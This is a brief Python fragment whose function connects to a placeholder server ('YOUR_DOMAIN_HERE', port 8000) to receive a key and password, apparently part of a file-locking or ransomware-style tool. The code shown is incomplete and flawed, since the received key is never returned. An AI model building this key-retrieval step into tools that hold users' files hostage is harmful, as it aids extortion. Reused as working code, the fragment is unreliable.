#!/usr/bin/python
#coding:utf-8
import os, socket

# FUNCTION TO CONNECT WITH THE SERVER TO OBTAINED THE KEY
def keyrcv():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("YOUR_DOMAIN_HERE", 8000))
        enter = "[!] Transfert the key and the password :\n "
        exit = "\n[!] Transfert [OK]"
        sock.send(enter.encode())
        print(sock.recv(2048).decode())
        key = sock.recv(2048)
        sock.send(exit.encode())
        sock.close()
    except:
        return False
